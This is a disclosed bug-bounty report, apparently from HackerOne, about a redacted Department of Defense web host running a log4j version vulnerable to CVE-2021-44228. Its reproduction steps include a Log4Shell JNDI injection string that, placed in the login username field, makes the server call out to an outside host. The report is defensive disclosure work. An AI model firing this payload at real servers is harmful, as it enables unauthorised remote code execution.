---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/use-of-externally-controlled-format-string
  - env/web
  - vuln/code-injection
substate: "resolved"
weakness: "Use of Externally-Controlled Format String"
enriched: true
body: true
date: 2022-01-19
submitted: 2021-12-11T00:16:38.725Z
bounty_usd: null
votes: 4
cve: "CVE-2021-44228"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "alex_gaynor"
source: "https://hackerone.com/reports/1423496"
title: "██████████ running a vulnerable log4j"
---
# ██████████ running a vulnerable log4j

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 4 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-01-19

- Report: [https://hackerone.com/reports/1423496](https://hackerone.com/reports/1423496)
- CWE: Use of Externally-Controlled Format String | CVE: CVE-2021-44228
- Submitted: 2021-12-11T00:16:38.725Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

## Impact

Probably arbitrary code execution

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Browse to https://████████/███████https%3A%2F%2F█████████%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit

Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.

## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.

## Timeline

- **Report Filed**
- **2021-12-11** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2021-12-28** @agent-bk1: ████
- **2021-12-28** @alex_gaynor: ███
- **2021-12-28** @agent-bk1: ██████
- **2021-12-28** @alex_gaynor: ████████
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
